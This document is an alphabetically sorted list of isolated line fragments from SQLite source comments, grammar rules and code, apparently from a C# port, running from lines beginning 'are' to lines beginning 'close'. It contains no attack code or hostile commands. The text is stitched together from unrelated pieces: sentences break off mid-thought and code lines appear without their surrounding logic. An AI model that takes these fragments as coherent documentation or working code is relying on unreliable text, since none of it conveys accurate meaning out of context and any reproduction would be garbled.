 are enabled so that SQLite will be safe to use in a multi-threaded
 are encoded into bitvectors as follows:
 are evaluated in order to get the data for this row.  If nColumn>0
 are exhausted and only data in select A remains.
 are exhausted and only data in select B remains.
 are harmless no-ops.
 are included in a few cases in order to enhance the resilience
 are included instead. This is to support column declarations that
 are initialized to NULL.
 are inserted in between.  The locking might fail on one of the later
 are inserted into the RowSet in an arbitrary order.  Inserts
 are intended for debugging activity only.
 are intended for use inside assert() statements. {H17081} The SQLite core
 are made to pExpr:
 are matched against result set expressions of compound SELECT
 are merely placeholders.  Real drivers must be substituted using
 are no more.
 are no outstanding page references when this function is called.
 are no-ops.
 are not 
 are not counted.  Only real table changes are counted.
 are not possible and in those cases prior pointers are invalidated.
 are of the form [SQLITE_STATUS_MEMORY_USED 
 are omitted and the application must call sqlite3_initialize() directly
 are only required to provide these routines if SQLITE_DEBUG is
 are only valid for a single execution.
 are passed directly through to the second and third parameters of
 are played back.
 are queried from within xNext() and other v-table methods using
 are read-only after initialization is complete.
 are removed.  If zWhere==0 then all entries are removed.
 are required.  The following table supplies these names 
 are reused.
 are seen.
 are set to values that describe the columns used by the trigger program
 are shown in a different format.  p.explain==2 is used to implement
 are stored in the pSpace buffer allocated immediately below.
 are stored.
 are the
 are the conditions that must be met in order for writing to
 are the integer memory register numbers for counters used to compute
 are the name of the table and database named in the FROM clause term.
 are the same and false (0) if they are different.
 are the same as opcode values (ex: OP_Eq) that implement the corresponding
 are two versions of this function.  btreeParseCell() takes a
 are used to add SQL functions or aggregates or to redefine the behavior
 are:
 area           
 area.  pCell might point to some temporary storage.  The cell will
 argc == 2 )
 argument and the result returned. Examples:
 argument can be [SQLITE_UTF16_ALIGNED] if the
 argument if the arguments are different.  The result is NULL if the
 argument is not used by this opcode.  It is only there to disambiguate
 argument must be a multiple of 16. The sz parameter should be a few bytes
 argument of the application-defined function.  Subsequent
 argument points
 argument should point to an allocation of at least sz
 argument to calls it makes to the xLock() and xUnlock() methods
 argument to sqlite3VdbeKeyCompare and is used to control the
 argument to the user-function defined by pCtx. Any previous value is
 argument to xCallback().  If xCallback=NULL then no callback
 argument to xOpen.  The xOpen method does not have to
 argument was constant then bit 0 of P1 is set. This is used to determine
 argument.
 arguments 
 arguments are equal to each other.
 arguments or differing preferred text encodings.  SQLite will use
 arguments to sqlite3GenerateConstraintChecks.
 arguments.
 argv!=null ){
 argv[0] == null 
 argv[1] == null )
 argv[1] and following are modifiers.  Parse them all and write
 argv[2].Length != 0 )
 argv[i 
 array          
 array already accumulated. We can then clear the array and
 array for each index associated with table being updated.  Fill in
 array is szEntry bytes in size.  This routine allocates a new
 array of three CollSeq structures. The first is the collation sequence
 array so that an OP_VBegin will get generated for it.  Add pTab to the
 array will never overflow.
 array. tolower() is used more often than toupper() by SQLite.
 arrays.  aType[i] will contain the type integer for the i-th
 arrive.
 as 1 byte of data.
 as ::= 
 as ::= AS nm 
 as ::= ids 
 as a co-routine.  The code is common to both the 3rd and 4th
 as a mutex) it returns an [error code] other than [SQLITE_OK].
 as a schema-lock must have already been obtained to create it. Since
 as a temporary buffer to inspect the first couple of bytes of
 as allocating stack space and initializing the program counter.
 as an argument. If SQLITE_CHECK_PAGES
 as an auto-vacuum capable db.
 as an indication to the caller that it should sort by the i-th column.
 as an instance of the following structure:
 as an open file handle for journal files.
 as deep as it needs to be in order to contain the entire list.
 as each SQL statement finishes.  The profile callback contains
 as each triggered subprogram is entered.  The callbacks for triggers
 as either UTF-8 or UTF-16.  The sqlite3_prepare() and sqlite3_prepare_v2()
 as expired.
 as extensions by SQLite should 
 as follows:
 as it existing before this routine was called.
 as it is usually understood.
 as it will not be possible to open the journal file or even
 as its first parameter a copy of the void
 as many bytes as possible are moved into the overflow pages without letting
 as needing reloading.  This must be done when using the SQLITE_TEMP_STORE
 as pCur and having the same root page number as pCur.  The value is
 as part of process initialization and before any SQLite interface
 as side effect.
 as sqlite3.enc.
 as the OP_OpenEphm instruction is coded because not
 as the argument.
 as the first argument to [sqlite3_test_control()].
 as the first argument.
 as the first argument. Write into pIdx the index into pPage.aData[]
 as the last parameter. This function may calculate the cost of
 as the previous instance of the same wildcard.  Or if this is the first
 as the statement first begins executing.  Additional callbacks occur
 as the table to be indexed.  pParse.pNewTable is a table that is
 as the text of an error message.  SQLite interprets the error
 as the user-data for the function.
 as the value is never used.  So really the only thing this code
 as the vdbe level waits until the table is read before actually
 as there is a time string.  The time string can be omitted as long
 as there is a year and date.
 as they are added to the instruction stream.
 as this module treats each b-tree as a separate structure. To determine
 as well as the boolean result value.
 as well. This function is only used when the journal file is being
 as:
 aspect of the [database connection] is being configured.
 assert() was enabled at compile-time.  If X is true and assert()
 assertion that the transaction counter was modified.
 asserts that page number iChild is the left-child if the iIdx'th
 assigned.
 associate metadata with argument values. If the same value is passed to
 associated affinity type.
 associated by the sqlite3_set_auxdata() function with the Nth argument
 associated file-descriptor is returned. FILEHANDLEID() takes an sqlite3_file
 associated struct Trigger instance. The first element of the linked list is
 associated with a [database connection]. If a prior API call failed
 associated with a particular database connection.  The use of
 associated with connection db. The operation will return SQLITE_LOCKED
 associated with such a value.
 associated with the VM. Of course only a subset of these structures
 associated with the [database connection] handle should be released by
 associated with the database connection pDb.  If no prepared statement
 assumed that the database is corrupt.
 assumed to each already be in sorted order.
 assumes a minimum cell size of 6 bytes  (4 bytes for the cell itself
 assumes that the next time the page is retrieved from the cache using
 assumes that the text or BLOB result is in constant space and does not
 assumes the memory subsystem has already been initialized.
 at a time and provides a journal for rollback.
 at a time can appear in Mem.type.
 at a time.  Each call to sqlite3_set_authorizer overrides the
 at all times.
 at is deleted out from under them.
 at least one non-zero bytes at the start of the journal file.
 at least one row of the right table has matched the left table.
 at most one effective restoreCursorPosition() call after each
 at offset 24 into the file.  The first 4 of these 16 bytes are
 at representing the value that 
 at that point because identifiers had not yet been resolved.  This
 at the b-tree/pager level.
 at the beginning of a page.
 at the conclusion of a transaction.
 at the conclusion of the call.
 at the end of every transaction.
 at the end of the file instead of one. The first allocated page
 at the end soon afterwards so the nearly empty page will quickly
 at the internal representation of an [sqlite3_mutex].  It only
 at the same instant.
 at the same time then the results are undefined.
 at the time when the BLOB is closed.  Any errors that occur during
 atoi() library routine in RedHat 7.2.
 atomic commit and rollback through the use of a journal file that
 attached database is returned.
 attached databases.
 attached databases].</dd>
 attached to the right. For the same reason the EP_ExpCollate flag
 attached to the table.
 attack.  Developers might also want to use the [sqlite3_set_authorizer()]
 attempt to allocate a new one.
 attempts to open a temporary file.  This information is used for
 authorized.  The 3rd and 4th parameters to the authorization
 authorizer callback function] must
 authorizer documentation] for additional
 authorizer will fail with an error message explaining that
 autoInc == 1 )
 autoconf-based build
 autoinc ::= 
 autoinc ::= AUTOINCR 
 autoincrement tables.
 automatic journal playback and recovery mechanism will deal
 automatically created indices. Users can do as they wish with
 automatically created table with root-page 1 (an INTKEY table).
 automatically deleted as soon as the database connection is closed.
 automatically rolled back because the database connection is closed.
 automatically.
 automaton.
 autovacuum pointer-map pages. Guess that the next page in
 auxiliary database file if P1==1 or in an attached database if
 auxiliary databases added using the ATTACH command.
 auxiliary databases.  Return one of the SQLITE_ error codes to
 avail < len )
 avail>=9 )
 avail>=payloadSize 
 available for use within this function.
 available free spot. check to see if this is going to 
 available space.
 available.
 avoid the OP_SCopy.
 avoid the use of malloc()/free().  Those routines work ok on windows
 avoided.
 azCol[] values in the callback.
 b != 0 
 b < zRight.Length 
 b == zRight.Length ) return 0
 b-tree page.  
 b-tree page.  Write the number of available bytes into pAmt.
 b-tree to invalidate any incrblob cursors that are open on the
 b-tree within a database file.
 b-tree).
 b0..b7    ........ 
 b01[1]==0xFE ){  //  if( b1==0xFF 
 b01[1]==0xFF ){//  if( b1==0xFE 
 b2==0xFE ){
 b2==0xFF ){
 b8..bf    ........ 
 b: p1 (unmasked) 
 b: p1<<14 
 b: p1<<28 
 b: p3<<28 
 bCoreMutex 
 bFullMutex 
 bInteger 
 bLong 
 bMemstat 
 bRev )]
 bRev == 1 )
 bRev) 
 bRev]
 bText 
 back (or no pages if the journal header is corrupted). The journal file
 back a journal created by a process with a different sector size
 back any currently active btree transactions. If there are any active
 back as part of a savepoint (or statement) rollback from an
 back by this database connection.
 back independently if a failure occurs.
 back independently of the main transaction. You must start a transaction
 back into the input registers P1 and P3.  So this opcode can cause
 back to NULL pointers too.  This will cause the malloc to go
 back to its default implementation when sqlite3_initialize() is
 back to its starting state so that it can be reused. A success code from
 back to sqlite3Malloc().
 back to the root page as balance() used to invalidate the contents
 backup in progress needs to be restarted.
 backwards compatibility.  Note also that sqlite3_snprintf()
 balance_deeper() function to create a new child for the root-page
 balancing routine to fix this problem (see the balance() routine).
 balancing the tree following the delete operation easier.  
 baseCur )
 based on information extract from the raw disk page.
 batch number is O(NlogN) where N is the number of elements in the RowSet.
 be NULL for a primary key or an index that is created to satisfy a
 be NULL.
 be NULL.  The pSrc corresponds to the FROM clause of a SELECT or
 be a pointer to an sqlite3_vtab structure. Otherwise
 be aligned to an 8-byte boundary or subsequent behavior of SQLite
 be allocated by the cache. szPage will not be a power of two. The
 be allowed:
 be an integer.
 be applied to both operands prior to doing the comparison.
 be bound.</dd>
 be called next to set pCol.affinity correctly.
 be called on an SQL statement before sqlite3_step().
 be committed or rolled back. Call sqlite3VdbeCloseStatement() to
 be constructed in this temporary area then copied into pPage.aData
 be correct.  But by initializing the checksum to random value which
 be deallocated after sqlite3_result_value() returns without harm.
 be dealt with by the playback routine.  Ticket 
 be deleted (by being passed to their respective ...Delete() routines)
 be discarded.
 be done before determining whether a master journal file is
 be easily added without having to defragment the page.
 be either under or overfull. In this case run the balancing algorithm
 be exactly zero.
 be exercised on Linux (which does not need to malloc() in the driver)
 be found with <column> as its left-most column.
 be freed by the calling function.
 be given much smaller limits designed to prevent a denial of service
 be held while the callback is running.  Recursive calls into
 be in PAGER_SHARED before it transitions to PAGER_RESERVED.)
 be initialized.  
 be invoked every nOps opcodes.
 be invoked prior to calling this routine.  The sqlite3BtreeCommitPhaseOne()
 be laoded into internal hash tables where is can be used.
 be marked as dirty. Returning an error code will cause a
 be moved to the allocated page (unless the allocated page happens
 be of the form:
 be one of the input registers (because the following call to
 be one of the values in the first Debug.Assert() below. Variable p.rc
 be opaque because it is used by macros.
 be overridden at runtime using the sqlite3_config() API.
 be parsed.  Initialize the pParse structure as needed.
 be passed to the unlock-notify callback is larger than the
 be played back into the database. If a power failure occurs while
 be redundant.
 be released by a call to [sqlite3_blob_close()].
 be rolled back.
 be sent.
 be set for operations that might fail (due to a constraint) part of
 be set.  An INTEGER PRIMARY KEY is used as the rowid for each row of
 be stored in lookaside because in shared cache mode the schema information
 be stored in target.  The result might be stored in some other
 be stored.
 be successful even if it is subsequently rolled back.
 be tailored to the specific needs of the module implementation.
 be the case that the same database connection is being used by two or
 be the right kind (index or table) of b-tree page. Otherwise
 be true and false so that the unreachable code then specify will
 be unique across all VFS modules.
 be used as a hot-journal and the current transaction rolled back.
 be used if it has not undergone any affinity changes.  But if
 be used to monitor the performance characteristics of the prepared
 be used to service read() and write() requests. The actual file
 be used unless <column> is an INTEGER PRIMARY KEY or an index can
 be written out into the database file before its journal file
 be zero already. So this next line is harmless in that case.
 be zero.  If 
 because columns might end up being NULL if the table does not match -
 because deleting an item can change the scan order.
 because garbage data that appears at the end of a journal is likely
 because it is blocked by the second and the second process cannot
 because it was there before or because we just created it).
 because the first match might be for one of the deleted indices
 because they could be computed at compile-time.  But when LIMIT and OFFSET
 become a no-op.
 become overfull or underfull. The next iteration of the do-loop
 becomes:
 been allocated and this routine is a noop.
 been closed by [sqlite3_blob_close()].  Passing any other pointer in
 been created when we processed the CREATE TABLE.  All we have
 been encountered.
 been invoked for this locking event.  If the
 been performed. seekResult is the search result returned (a negative
 been played back.  If the page at 
 been read if [SQLITE_OK] had been returned.  The [SQLITE_IGNORE]
 been referenced and the calling routine is responsible for calling
 been seen on a column.  This routine sets the notNull flag on
 been used instead of this routine. 
 been written to the journal have actually reached the surface of the
 before [sqlite3_step()].
 before any of them can be written out to the database file.
 before attempting the conversion.
 before being added to the SrcList.
 before calling sqlite3_initialize() or any other public sqlite3_
 before it is reset. This is used by trigger programs.
 before looking up the table.
 before or after the key.
 before reaching this instruction. 
 before starting a subtransaction. The subtransaction is ended automatically
 before the [BLOB handle] expired are not rolled back by the
 before the database closes.  It is also called during a rollback
 before this function exits.
 before this routine returns.
 begin accumulating any further context pointers without
 beginning of the page.
 beginning with 0 in order to make the best possible use of the available
 beginning with the left-most SELECT and working toward the right.
 beginning-of-error-codes 
 begins to be used in different ways in the future.
 behave a differently in two ways:
 behave as no-ops.
 behavior (assert if the argument to ALWAYS() is false) is the case if
 behavior so that all architectures behave as if integer
 behavior.
 being analyzed is:
 being called from sqlite3_reset() to reset the virtual machine.
 being closed. The connection is removed from the blocked list.
 being destroyed before it is finished parsing.
 being discarded by the truncation must be written to the journal
 being freed as a new leaf.
 being included by every source file.
 being moved.  So we cannot stop searching after the first match
 being reverted was opened.
 being set to NULL after releasing any dynamic resources.
 below verify that the numbers are aligned correctly.
 best query plan and its cost into the WhereCost object supplied
 best query plan and its cost into the WhereCost object supplied as the
 bestPlan.plan.wsFlags )
 better if FILE_FLAG_RANDOM_ACCESS is used.  Ticket 
 better organized.
 between SQLITE_MUTEX_RECURSIVE and SQLITE_MUTEX_FAST if it does
 between UTF8 and UTF16.
 between VDBE cursor numbers and bits of the bitmasks in WhereTerm.
 between formats.
 between localtime and UTC (a.k.a. GMT)
 between moveToLeftmost() and moveToRightmost().  moveToLeftmost()
 between pPage and up to 2 of its sibling pages. This involves
 between_op ::= BETWEEN 
 between_op ::= NOT BETWEEN 
 big FreeBlk that occurs in between the header and cell
 big and we want to break it down some.  This packaged seemed like
 big comment (similar to this one) will mark the point in the code where
 big-endian host. Because both the UTF16NATIVE and SQLITE_UTF16BE
 binary operator. Either or both may be NULL.
 binary searches needed.
 binary value has been obtained from malloc and must be freed by
 bindings] on a [prepared statement].
 bit 0 to be set.  Column 1 sets bit 1.  And so forth.  If the
 bit is clear then fall thru if either operand is NULL.
 bit is set in the flags field of the Db structure. If the database
 bit values expressing I/O characteristics of the mass storage
 bitmap.  Bits are numbered starting with 1.
 bitmap.  The least significant bit is bit 1.
 bitmask for all tables to the left of the join.  Knowing the bitmask
 bits are significant.
 bits in a Bitmask
 bits that will fit in a Bitmask.  The VDBE cursor numbers might be
 bits to act as the reference 
 bitvec.
 bitvecs of all open savepoints. Return SQLITE_OK if successful
 blob content
 blob in register P2. This instruction is not coded directly
 blob of allocated memory. This function should not call sqlite3_free(ref )
 blob of associated data.  
 blob stored in dynamically allocated space.
 blob.
 blob_bytes() functions.
 block never runs if journal_mode=OFF.
 block of code will expand the out query to 4 slots.  The middle
 block of registers has already been deallocated by the time
 blocked connection. If sqlite3_unlock_notify() is called when the
 body of a TRIGGER.
 body of a trigger.
 bool needQuote
 bool neg
 bool shortNames
 boolean 
 boolean complement in register P2.  If the value in register P1 is
 both at the same time.
 both real and virtual table scans.
 both their own internal database and also databases that are controlled
 bound]
 boundary or subsequent behavior of SQLite will be undefined.</dd>
 boundary.
 break
 break backwards compatibility - it needs to be a warning.
 broken and we intend to never break backwards compatibility.
 btree as the argument handle holds an exclusive lock on the
 btreeInitPage() be called on every btree page so we make
 btreeInitPage() did not detect overlapping cells or
 btreeInitPage() is executed.  
 btreeInitPage().
 btreeParseCell() to fill it in.
 buf. It is assumed that the caller has allocated sufficient space.
 buf[1] )
 buf[2] )
 buf[3] )
 buf[5] )
 buf[7] )
 buf[length] != 0 
 buf[offset 
 buffer Pager.pTmpSpace is (mxPathname
 buffer and where forced to overflow to [sqlite3_malloc()].  The
 buffer and where forced to overflow to [sqlite3_malloc()].  The values
 buffer before VdbeRecordCompare() can be called. 
 buffer big enough to hold one page. If while inserting cells into the parent
 buffer pBuf).
 buffer space that is separate from the pPage buffer area 
 buffer supplied as the second parameter whose size is given by
 buffer that holds real variable.  The constant is also the initializer
 buffer that the pager module resizes using sqlite3_realloc().
 buffer with a nul-terminated UTF-8 encoded error message
 buffer.
 buffer. It will be copied out again as soon as the aSpace[] buffer
 bug caused by the interaction of two useful IO optimizations surrounding
 build the NEW.
 build the sqlite_master entry
 builds on processors without floating point support.
 built-in functions in the same [database connection] with the same name.
 busy handler] that sleeps
 busy-handler callback can be used when upgrading to the EXCLUSIVE
 busy-handler function]
 but any number may have active read transactions.
 but can be as large as 2 billion for a really big database.
 but could happen. In this case abandon processing and return the error.
 but cursors cannot be shared.  Each cursor is associated with a
 but does not include the null terminator.
 but has received an SQLITE_LOCKED error because another connection
 but it does 
 but it doesn't deal with overflow cells - just moves them to a
 but joins might run a little slower.  The trick is to disable as much
 but leaves the result in UTF-16 in native byte order instead of UTF-8.
 but no other fields in the WhereTerm object are meaningful.
 but not backwards compatible.
 but only has to scan the data once.  And because indices might
 but that meant we more testing that we needed.  By only testing the
 but the test harness needs to access it so we make it global for
 but the transaction is not rolled back.  FAIL processing means that
 but they do so indirectly.  A single WhereMaskSet structure translates
 by 6 spaces.  But the left-most 6 spaces have been removed to improve the
 by Btree handle p. Parameter eLock must be either READ_LOCK or
 by P1.  The integer query plan parameter to xFilter is stored in register
 by SQLite to create journal files if the atomic-write optimization
 by a [virtual table].
 by a connection in read-uncommitted mode is on the sqlite_master
 by a previous call to balance_nonroot(). Its contents are
 by a prior successful call to [sqlite3_blob_open()] and which has not
 by a single thread.</dd>
 by all database connections.  The p->pNext is a list of other
 by allocating the tables we will need.
 by an [sqlite3_backup] object. The number of pages still to be backed
 by an instance of the following structure
 by connection db have now been released. Call sqlite3ConnectionUnlocked()
 by database connection db have been released.
 by default.  Autocommit is disabled by a BEGIN statement and reenabled
 by failed call to [sqlite3_blob_open()]) is a harmless no-op.
 by having its state changed to CURSOR_FAULT.
 by higher-level routines.
 by invoking [sqlite3_mutex_enter]([sqlite3_db_mutex](D)) before beginning
 by its 2nd argument.
 by making either argument NULL
 by manually setting the autoCommit flag to true and detaching the
 by multiple threads. It is thread-safe.
 by parameter vfsFlags ORed with the following:
 by passing the pointer returned by this function to //sqlite3_free().
 by selectExpander() but the type and collation information was omitted
 by setting PENDING_BYTE low and running the entire regression suite.
 by sorting in order of ROWID.  Return true if so and set pbRev to be
 by sqlite into the error message available to the user using
 by sqlite3AuthContextPush
 by sqlite3StartTable().
 by sqlite3_malloc() or sqlite3_realloc() releases that memory so
 by sqlite3_realloc() and the prior allocation is freed.
 by subsequent calls to sqlite
 by the PgHdr.pDirty pointer. This function writes each one of the
 by the [sqlite3_module.xClose 
 by the caller. See comments above writeMasterJournal() for the format
 by the calling function 
 by the child-page of the cell that was just deleted from an internal
 by the copy of the p->u.zToken string (if any).
 by the current thread may be //sqlite3_free()ed.
 by the file truncation.
 by the first parameter.  The name of the module is given by the 
 by the getVarin32() macro 
 by the most recent call to sqlite3WhereBegin().  Each call to WhereBegin
 by the new table.
 by the next COMMIT or ROLLBACK.
 by the pager.  This is a buffer that is big enough to hold the
 by the real entry in code generated at sqlite3EndTable().
 by the select statement passed as an argument.
 by the sqlite3_io_methods object.
 by this connection. Instead of deleting the journal file it was
 by untrusted external sources.  An example application might be a
 by writing an updated version of page 1 using a call to the
 by x=EXPR or x IS NULL constraints or x IN (...) constraints.
 by xInit.  The pAppData pointer is used as the only parameter to
 byte are used.  The integer consists of all bytes that have bit 8 set and
 byte offset 24 of the pager file.
 byte offset 64 (== 36
 byte order.  If the third parameter to sqlite3_result_error()
 byte out of a specific range of bytes. The lock byte is obtained at
 byte page number followed by a variable length integer. In other
 byte past the end.
 byte ranges are used for Unix.  This leaves open the possiblity of having
 byte to have been modified while this cursor is holding a reference
 byte to the start of it to prevent it from being recognized.
 bytes (not characters) from the 2nd parameter as the error message.
 bytes are stored on overflow pages.  The payload for an entry
 bytes in size.
 bytes in the record.
 bytes of data are located directly before it in memory (i.e. the total
 bytes of key and data in a btree cell.
 bytes on each page of the database (often 1024). The second is the
 bytes per page is left unchanged.
 bytes were read successfully and SQLITE_IOERR if anything goes
 bytes. The PAGE_TO_PGHDR1() macro does the opposite: its argument is
 c != '
 c != ')' )
 c != ']' 
 c != 0 
 c != 0 ) amt
 c != delim ) 
 c != wc[0] 
 c != wc[1] 
 c != wc[2] )
 c - '0'
 c < 0x7f )
 c <= '9' )
 c <= 9 
 c <= c2 ) seen = 1
 c == '
 c == '[' 
 c == 'z' )
 c == WO_EQ )
 c == WO_GE )
 c == WO_GT )
 c == WO_IN )
 c == WO_ISNULL )
 c == WO_LE )
 c == WO_LT )
 c == matchAll )
 c == matchOne )
 c->szPage)
 c0..c7    ........ 
 c1 
 c2 != ']' )
 c2 != c )
 c8..cf    ........ 
 c<0xE000 ){                                       
 c<='9'
 cache array (BtCursor.aOverflow). Subsequent calls use this
 cache can be discarded and the error code safely cleared.
 cache database pages that are not currently in use.
 cache implementation is loaded using the SQLITE_CONFIG_PCACHE option.
 cache is determined by the value of the createFlag parameter passed
 cache setting should set it explicitly.
 cache size stored on the disk so the cache size will revert
 cache to make seeking to the supplied offset more efficient.
 cache will be left in an inconsistent state and so the error
 cache.
 cache.  pOther is found by looking at db->pBlockingConnection.
 cache. So call pager_error() on the way out to make any error
 cached column value that has previously undergone an
 cached parse of the page). MemPage.isInit is marked
 calendar system.
 call above. Just before that function was freed they were released
 call below will unlock the pager.  
 call btreeGetPage() on page 1 again to make
 call is a no-op.
 call sqlite3Reprepare() and try again.
 call that concludes the blocking connections transaction.
 call the nBytes parameter is ignored and a pointer to the same blob
 call this on a VM that is in the SQLITE_MAGIC_HALT state.
 call to TryEnterCriticalSection() is 
 call to any SQLite API function.
 call to btreeGetPage.
 call to btreeInitPage() will likely return SQLITE_CORRUPT.
 call to sqlite3BtreeCopyFile(). The main database btree level
 call to sqlite3_backup_step().
 call to sqlite3_close(db) and db has been deallocated.  And we do
 call to sqlite3_shutdown() since the last sqlite3_initialize().  Only
 call to xUnpin() unpins the page regardless of the number of prior calls 
 call which may be made from within pagerUnlockAndRollback(). If it
 call will do so. We need to do this before the check for active
 call will segfault.
 callback for a given sqlite handle.
 callback for the database handle. Each pager opened via the sqlite
 callback function will be parameters or NULL depending on which of these
 callback is currently invoked only from within pager.c.
 callback is invoked from within the [sqlite3_step] or [sqlite3_close]
 callback routine.
 callback. If two or more such blocked connections have specified the
 callback. This is only used if the SQLITE_CHECK_PAGES macro is
 callbackIsInit == 0
 callbacks when pages are changed or the cache invalidated.
 callbacks.
 called at the beginning of sqlite3VdbeExec().  The mutexes are
 called correctly.
 called on an outstanding page which means that the pager must
 called on an uninitialized cursor.
 called right after sqlite3_open().
 called via macros that record the current file and line number in the
 called while other threads are running the same or different SQLite
 called with a NULL argument.
 called.
 caller holds appropriate locks.
 caller must ensure that there are no outstanding references to any pages
 caller should have first obtained a lock specifying the root page of
 caller to eventually free p.idxStr if p.needToFreeIdxStr indicates
 caller to use vdbe code equivalent to the following:
 caller will handle out of memory 
 caller-supplied buffer. N bytes of data are copied from the buffer Z
 caller-supplied buffer. N bytes of data are copied into buffer Z
 caller.
 caller. Set the error code in the database handle to the same value.
 caller. The values may be accessed using the [column access functions].
 caller. This is done to protect the sqlite3.pDisconnect list. The
 calling function needs to do that.
 calling sqlite3PcacheSize().
 calling this routine.  Repeat the error for robustness.
 calling this routine.  Such pointers may be reinitialized by referencing
 calling thread or is not currently allocated.  {H17033} SQLite will
 calls are made as part of the process of resetting a statement to be
 calls sqlite3_initialize() so the SQLite library will be automatically
 calls this routine will use that memory cell to store the termination
 calls to sqlite3BtreeCommitPhaseTwo() are only closing files and
 calls to sqlite3PagerGet() return zeroed pages instead of
 calls to sqlite3VdbeExec().
 can also be used to describe a particular table such as the table that
 can be determined using the [sqlite3_blob_bytes()] interface.
 can be fully or partially disabled using a call to [sqlite3_config()]
 can be intermixed with tests to see if a given rowid has been
 can be obtained by calling [sqlite3_reset()] on the
 can be optimized using inequality constraints.  Return TRUE if it is
 can be passed as the first argument to the [sqlite3_config()] interface.
 can be passed as the second argument to the [sqlite3_db_config()] interface.
 can be rolled back after an error without having to roll back the
 can be rolled back without having to rollback the entire transaction.
 can be set using the sqlite3_bind_
 can be sure the expressions are the same.  In the places where
 can be used to make sure boundary values are tested.  For
 can be used to read or write small subsections of the BLOB.
 can be used with this pager. The optimization can be used if:
 can be used.
 can be written to. The caller has already promised not to write to it.
 can be written to. The caller has already promised not to write to that
 can compute the mapping above using the following expression.
 can enter.  If the same thread tries to enter any other kind of mutex
 can enter.  {A17028} If the same thread tries to enter any other
 can handle (i.e. not CURRENT_TIME etc.)
 can insure that all cases are evaluated.
 can manually set this value to 1 to emulate Win98 behavior.
 can never be used again.  This happens when a rollback
 can use OP_Column and OP_Rowid opcodes on these cursors to extract
 can use the already allocated buffer instead of allocating a
 cancelled later because we still need to use the pKeyInfo
 cancelled.
 cannot appear on views.  So we might as well translate every
 cannot be found.
 cannot be read from the journal file an error code is returned.
 cannot be trusted. This state can be cleared by completely discarding
 care if you decide to try to use this routine for some other purposes.
 care of changing this register value to non-NULL if the RHS is NULL-free.
 careful use of indices.</dd>
 carry around information that is global to the entire parse.
 case 1 trumps case 2 
 case as the call to this function that loaded the root-page (either
 case by setting scratchAllocOut to 1 when an allocation
 case is handled by the calling routine.
 case means that every term of the OR clause is of the form
 case that a second error occurs on a separate thread in between
 case that more than one of these conditions is true.
 case that the size of the journal file had already been increased but
 case the call to sqlite3_backup_step() can be retried later on. If
 case the order does matter 
 case the record number is the same as that column.
 case this routine will return a false-positive. The pager_playback()
 case where the integer is a single byte.  It is a little slower when the
 case.  Thus  'a' LIKE 'A' would be true. 
 case. i.e. if the character is a lower-case ASCII character.
 case_else 
 case_else ::= 
 case_else ::= ELSE expr 
 case_exprlist 
 case_exprlist ::= WHEN expr THEN expr 
 case_exprlist ::= case_exprlist WHEN expr THEN expr 
 case_operand 
 case_operand ::= 
 case_operand ::= expr 
 cases of nByte<=0 will be intercepted and dealt with by higher level
 cases the parameters are named as per the usual conventions.
 cases where it really needs one.  If a faster non-recursive mutex
 cases where it really needs one.  {END} If a faster non-recursive mutex
 cases where nByte<=0 will have been intercepted by higher-level
 cases where pPrior==0 will have been intecepted and dealt with
 cause an Debug.Assert() statement to fail.  
 cause any problems.)
 cause the implemented SQL function to throw an exception.
 caused by subtriggers since those have their own context.
 causes a rollback journal to be created (if it does not already exist)
 causes an immediate jump to EofA and an EOF on B following nextB causes
 causes the operation in process to fail and for the current transaction
 cbKeyData (4 bytes) 
 cbrk >= iCellFirst)
 ccons ::= CHECK LP expr RP 
 ccons ::= COLLATE ids 
 ccons ::= DEFAULT LP expr RP 
 ccons ::= DEFAULT MINUS term 
 ccons ::= DEFAULT PLUS term 
 ccons ::= DEFAULT id 
 ccons ::= DEFAULT term 
 ccons ::= NOT NULL onconf 
 ccons ::= PRIMARY KEY sortorder onconf autoinc 
 ccons ::= REFERENCES nm idxlist_opt refargs 
 ccons ::= UNIQUE onconf 
 ccons ::= defer_subclause 
 cell consists of the integer key for the right-most cell of
 cell content   
 cell content area exceeds the value in the page header.  If these
 cell index as the second argument and btreeParseCellPtr()
 cell located on the root (or virtual root) page and the cursor state
 cell on pPage into the pSpace buffer.
 cell on pPage. The first two fields of this cell are the
 cell on the page to an overflow page. If either of these
 cell pointer   
 cell that will be inserted into pParent. Such a cell consists of a 4
 cell. The caller will overwrite them after this function returns. If
 cells (nMem
 cells are at least 4 bytes. It only happens in b-trees used
 cells can will fit on one page.  We assume a 10-byte page header.
 change counter (returned by subsequent calls to sqlite3_changes())
 change the length of the data stored. If this function is called with
 change.  This function may disappear.  Do not write code that depends
 changeCountDone
 changed by this function.
 changed to nPage pages (nPage
 changed.
 changes and so the view will need to be reset.
 changes due to the same operation are not backed out and no rollback
 changes to SQLite in order to tune SQLite to the specific needs of
 changes to a [database connection].  The interface is similar to
 changes to pExpr so that it refers directly to the source table
 changes to the database.  None of the following routines
 changes will not fit into the in-memory cache.  SQLite will
 changes.  When a process first reads the schema it records the
 changing the affinity.
 changing them.  We have to do some funky casting in order to
 changing.
 character '
 character it escapes that character and allows it to be inserted into
 character. Two bytes are required in the output buffer for the
 character:  0..9a..fA..F
 characters actually written into the buffer.  We admit that
 characters in each encoding are inverses of each other.
 characters must be converted to UTF-8 prior to passing them into
 characters.  Any attempt to create a function with a longer name
 check for a hot-journal before reading.
 check that it is defined. An undefined collation sequence exists when
 check the value of p->nOp-1 before continuing.
 checked out since either the beginning of this process
 checked out.</dd>
 checking information.  If the power fails while the journal is being
 checking on function usage and set a flag if any aggregate functions
 checks that the sqlite3.nTransaction variable is correctly set to
 checks this assumption - (p.rc) should be set to either SQLITE_DONE
 checks whether the file is both readable and writable.
 checks whether the file is readable.
 checksums - the statement journal does not.
 chngToIN holds a set of tables that 
 chngToIN set but t1 is not.  This term will be either preceeded
 choose a default page size in case we have to create the
 choose not to allocate a new page object and may reuse an existing
 chunk of the journal contains zero pages to be rolled back.  But
 chunks are kept on a linked list so that they can be deallocated
 ci.nData != this.nData 
 ci.nLocal != this.nLocal ) return false
 ci.nPayload != this.nPayload ) return false
 ci.nSize != this.nSize ) return false
 circumstances.
 class of constructs to be size limited.  The third parameter is the
 clause
 clause and the match can still be a success.
 clause is irrelevant.
 clause is seen as part of a foreign key definition.  The isDeferred
 clause of the aggregate query 
 clause processing on UPDATE and DELETE statements.
 clause reference other tables in a join.  If this is all true then
 clause.
 clean up and return.
 clean will clear the PGHDR_NEED_SYNC flag. Since the page is
 clear the legacy_file_format pragma flag so that a VACUUM will
 clear the p->locked boolean.
 clearly the mutex cannot be held if it does not exist.  But the
 close it now. Argument eOp must be either SAVEPOINT_ROLLBACK or
